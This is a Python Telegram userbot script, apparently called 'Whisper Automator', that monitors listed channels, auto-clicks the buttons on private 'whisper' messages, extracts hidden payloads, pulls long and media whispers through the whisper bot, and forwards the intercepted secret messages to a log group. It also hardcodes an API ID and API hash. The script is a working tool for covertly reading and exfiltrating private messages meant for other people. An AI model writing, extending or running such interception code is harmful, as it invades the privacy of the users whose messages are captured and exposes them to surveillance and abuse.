import asyncio
from datetime import datetime
import os
import re
import sys
import time
import traceback
from aiohttp import web
from telethon import TelegramClient, events
from telethon.sessions import StringSession

# ==================== CONFIGURATION ====================
API_ID = 23782654
API_HASH = "5b001caca4f436c940fea5e060f0a3c0"
SESSION_STRING = os.environ.get("SESSION_STRING")

TARGET_CHANNELS = [
    "chatpateee", -1002133821583,
    "its_diyaa", -1004469467503,
    "UnhingedAspirand", -1003954728685,
    "channelizpublick", -1004303326817,
    "fewmehh", -1004466801780
]

WHISPER_BOT_ID = 518335359 # @PsstRobot
LOG_GROUP_ID = -1004402300724

# Tracking context to keep link and channel name
ctx = {"title": "Target Channel", "link": "#", "time": 0}

client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)

# ==================== 1. CHANNEL HANDLER (AUTO-CLICKER) ====================
@client.on(events.NewMessage(chats=TARGET_CHANNELS))
async def channel_handler(event):
    if not event.buttons:
        return

    start_time = time.perf_counter()
    chat_name = event.chat.title if event.chat else "Target Channel"
    
    # Generate Message Link
    try:
        chat = await event.get_chat()
        msg_link = f"https://t.me/{chat.username}/{event.id}" if getattr(chat, 'username', None) else f"https://t.me/c/{str(event.chat_id).replace('-100','')}/{event.id}"
    except:
        msg_link = "#"

    print(f"\n📩 NEW WHISPER: [{chat_name}]")

    try:
        # STEP A: Check for Payload in Button URL (Deep Link)
        payload = None
        for row in event.buttons:
            for btn in row:
                if btn.url and 'start=' in btn.url:
                    payload = btn.url.split('start=')[-1]
                    break
        
        # STEP B: Trigger Popup to check for "Too Long" payload
        res = await event.click(0)
        popup_text = ""
        if hasattr(res, 'message') and res.message:
            popup_text = res.message
        elif isinstance(res, str):
            popup_text = res

        # Check if popup has the secret payload (-wh::...)
        if popup_text and "-wh::" in popup_text:
            match = re.search(r"-wh::[a-zA-Z0-9_=]+", popup_text)
            if match:
                payload = match.group(0)

        # STEP C: Final Execution
        if payload or "advanced" in popup_text.lower():
            print(f"🔗 Advanced Whisper detected. Sending payload to Bot...")
            ctx.update({"title": chat_name, "link": msg_link, "time": start_time})
            # Send the payload to bot to trigger DM response
            await client.send_message(WHISPER_BOT_ID, f"/start {payload}" if payload else "/start")
        
        elif popup_text and "advanced" not in popup_text.lower():
            # Normal Short Whisper
            elapsed = round((time.perf_counter() - start_time) * 1000, 2)
            log = (
                f"🔓 **Whisper Intercepted & Decoded!**\n\n"
                f"📝 **Secret Message:**\n{popup_text}\n\n"
                f"📍 **Channel:** {chat_name}\n"
                f"⚡ **Speed:** {elapsed} ms\n"
                f"🔗 [Message Link]({msg_link})"
            )
            await client.send_message(LOG_GROUP_ID, log)
            print(f"✅ Short Whisper Forwarded.")

    except Exception as e:
        print(f"❌ Channel Error: {e}")

# ==================== 2. BOT DM HANDLER (MEDIA FORWARDER) ====================
@client.on(events.NewMessage(from_users=WHISPER_BOT_ID))
async def bot_dm_handler(event):
    # Skip bot's welcome/instruction messages
    if event.message.text and any(x in event.message.text for x in ["Preparing", "Everyone", "/start", "button below"]):
        return

    print(f"📩 MEDIA/LONG MESSAGE RECEIVED FROM BOT DM!")

    try:
        now = time.perf_counter()
        if now - ctx["time"] > 60: ctx["time"] = now # Fallback
        
        elapsed = round((now - ctx["time"]) * 1000, 2)
        m_type = "Long Message"
        if event.photo: m_type = "Photo"
        elif event.voice: m_type = "Voice Note"
        elif event.video: m_type = "Video"

        log = (
            f"🔓 **Whisper Intercepted & Decoded!**\n\n"
            f"📝 **Secret Message:**\n[Advanced {m_type}]\n"
            f"{event.message.text if event.message.text else ''}\n\n"
            f"📍 **Channel:** {ctx['title']}\n"
            f"⚡ **Speed:** {elapsed} ms\n"
            f"🔗 [Message Link]({ctx['link']})"
        )

        # Send Media + Caption to Log Group
        await client.send_message(LOG_GROUP_ID, log, file=event.message.media if event.message.media else None)
        await client.send_read_acknowledge(event.chat_id)
        print(f"✅ Advanced Whisper Forwarded.")

    except Exception as e:
        print(f"❌ DM Error: {e}")

# ==================== STARTUP & WEB SERVER ====================
async def handle_ping(request): return web.Response(text="Bot Active")
async def main():
    await client.start()
    app = web.Application(); app.router.add_get("/", handle_ping)
    runner = web.AppRunner(app); await runner.setup()
    await web.TCPSite(runner, "0.0.0.0", int(os.environ.get("PORT", 8080))).start()
    await client.get_dialogs()
    print("🚀 Whisper Automator: PRO Engine Active (Auto-Tap Fixed)!")
    await client.run_until_disconnected()

if __name__ == "__main__": asyncio.run(main())
